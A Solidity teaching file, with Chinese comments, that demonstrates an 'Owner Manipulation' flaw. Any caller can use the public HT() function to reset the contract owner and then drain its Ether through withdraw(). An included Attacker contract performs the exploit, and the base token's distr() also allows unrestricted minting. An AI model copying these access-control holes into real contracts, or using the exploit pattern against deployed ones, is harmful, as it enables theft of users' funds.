// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

// 以下示範一個簡化版 ERC20 合約，用來呈現漏洞示例
contract ERC20 {
    mapping(address => uint256) public balances;
    uint256 public totalDistributed = 1000;

    // 此函式模擬分發代幣，只是做簡單的餘額累加
    function distr(address to, uint256 amount) public {
        balances[to] += amount;
    }
}

// 漏洞名稱: Owner Manipulation
// 漏洞描述: 這個漏洞允許攻擊者透過公開的 HT() 函式重新設定 owner 變數，
// 進而取得合約內部限制操作的權限，例如提款。

contract VulnerableHOTTO is ERC20 {
    // 漏洞點：owner 變數設定為 public，並且在 HT() 函式中重新賦值
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    // 漏洞點：此 public 函式可以被任何人呼叫，攻擊者藉由此函式能重設 owner
    function HT() public {
        owner = payable(msg.sender); // 攻擊者可藉由呼叫此函式來取代 owner
        distr(owner, totalDistributed);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT OWNER");
        _;
    }

    // 提款函式，僅允許 owner 呼叫，轉出合約中的所有 Ether
    function withdraw() public onlyOwner {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }

    // 接收 Ether 的 fallback 函式
    receive() external payable {}
}

// 攻擊示範合約
// 攻擊者利用漏洞，在部署後可呼叫 HT() 重設 owner，進而提取合約中的 Ether
contract Attacker {
    VulnerableHOTTO public target;

    // 修改點：使用 payable 轉換以符合 Solidity >=0.8.0 的規範
    constructor(address _targetAddress) {
        target = VulnerableHOTTO(payable(_targetAddress));
    }

    // 攻擊步驟說明：
    // 1. 呼叫 target.HT() 使自己成為 owner
    // 2. 呼叫 target.withdraw() 從合約中提取所有 Ether
    function attack() public {
        // 步驟1：改變 owner 為攻擊者地址
        target.HT();
        // 步驟2：提款
        target.withdraw();
    }

    // 能夠接收 Ether
    receive() external payable {}
}

/*
說明：
1. VulnerableHOTTO 合約中的 HT() 函式允許任何人呼叫，從而重新設定 owner
2. 攻擊者部署 Attacker 合約時，需將目標 VulnerableHOTTO 的地址傳入，
   並呼叫 attack() 執行重設 owner 與提款操作。
3. 已修改 Attacker 合約中 address 轉型部分，避免 Solidity >=0.8.0 的類型轉換錯誤。
*/
